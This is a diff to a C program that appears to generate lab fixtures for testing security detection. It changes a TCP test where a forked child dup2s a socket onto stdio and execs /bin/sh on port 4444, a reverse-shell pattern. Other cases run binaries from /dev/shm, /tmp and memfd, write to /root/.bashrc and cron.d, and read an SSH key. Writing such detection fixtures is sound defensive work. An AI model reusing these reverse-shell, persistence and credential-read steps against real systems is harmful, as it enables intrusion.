@@ -90,24 +90,27 @@ static void tcp_exchange(const char *ip, int shell) {
     int lst = socket(AF_INET, SOCK_STREAM, 0); CHECK(lst >= 0);
     struct sockaddr_in a=address(ip, shell ? 4444 : 80);
     CHECK(bind(lst, (struct sockaddr *)&a, sizeof(a)) == 0); CHECK(listen(lst, 1) == 0);
-    int cli=socket(AF_INET, SOCK_STREAM, 0); CHECK(cli >= 0);
-    CHECK(connect(cli, (struct sockaddr *)&a, sizeof(a)) == 0);
-    int srv=accept(lst, NULL, NULL); CHECK(srv >= 0); CHECK(close(lst) == 0);
+    int srv;
     if (shell) {
         pid_t pid=fork(); CHECK(pid >= 0);
         if (pid == 0) {
-            close(srv);
+            CHECK(close(lst) == 0);
+            int cli=socket(AF_INET, SOCK_STREAM, 0); CHECK(cli >= 0);
+            CHECK(connect(cli, (struct sockaddr *)&a, sizeof(a)) == 0);
             for (int i=0;i<3;++i) CHECK(dup2(cli,i) >= 0);
             if (cli > 2) close(cli);
             execl("/bin/sh", "sh", (char *)NULL); _exit(127);
         }
-        CHECK(close(cli) == 0);
+        srv=accept(lst, NULL, NULL); CHECK(srv >= 0); CHECK(close(lst) == 0);
         const char command[]="printf 'SHELL_OK\\n'; exit\n";
         write_all(srv,command,sizeof(command)-1);
         char buf[256]={0}; ssize_t used=0,n;
         while (used < (ssize_t)sizeof(buf)-1 && (n=read(srv,buf+used,sizeof(buf)-1-(size_t)used)) > 0) used+=n;
         CHECK(strstr(buf,"SHELL_OK\n") != NULL); child_ok(pid);
     } else {
+        int cli=socket(AF_INET, SOCK_STREAM, 0); CHECK(cli >= 0);
+        CHECK(connect(cli, (struct sockaddr *)&a, sizeof(a)) == 0);
+        srv=accept(lst, NULL, NULL); CHECK(srv >= 0); CHECK(close(lst) == 0);
         char buf[sizeof(payload)];
         write_all(cli,payload,sizeof(payload)-1);
         CHECK(recv(srv,buf,sizeof(payload)-1,MSG_WAITALL) == (ssize_t)sizeof(payload)-1);
@@ -163,7 +166,7 @@ static void run(const char *id) {
     } else if (!strcmp(id,"exec_shm")) execute_helper("/dev/shm/lab-helper",0);
     else if (!strcmp(id,"drop_execute")) execute_helper("/tmp/lab-helper",0);
     else if (!strcmp(id,"memfd_execute")) execute_helper(NULL,1);
-    else if (!strcmp(id,"shell_config_write")) file_write("/etc/bash.bashrc");
+    else if (!strcmp(id,"shell_config_write")) file_write("/root/.bashrc");
     else if (!strcmp(id,"cron_write")) file_write("/etc/cron.d/lab_fixture");
     else if (!strcmp(id,"ssh_read")) file_read("/root/.ssh/lab_key");
     else if (!strcmp(id,"udp_exchange")) udp_exchange();
